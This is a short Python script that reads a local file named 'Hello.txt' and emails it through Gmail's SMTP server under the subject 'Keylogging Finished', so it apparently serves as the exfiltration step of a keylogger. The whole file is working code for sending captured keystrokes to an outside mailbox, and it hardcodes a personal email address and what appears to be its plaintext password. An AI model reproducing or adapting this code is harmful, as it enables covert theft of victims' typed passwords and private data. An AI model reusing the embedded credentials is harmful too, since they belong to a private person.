import smtplib
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

from_addr = 'vasilije.dimitrijevic10@gmail.com'
to_addr = 'vasilije.dimitrijevic10@gmail.com'
subject = 'Keylogging Finished'
content = 'Here is the file'

msg = MIMEMultipart()
msg['From'] = from_addr
msg['To'] = to_addr
msg['Subject'] = subject
body = MIMEText(content, 'plain')
msg.attach(body)

filename = 'Hello.txt'
with open(filename, 'r') as f:
    part = MIMEApplication(f.read(), Name=basename(filename))
    part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
msg.attach(part)

print("Sending Email!")

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(from_addr, 'Vasa201020')
    server.sendmail(from_addr, to_addr, msg.as_string())

    print("Success")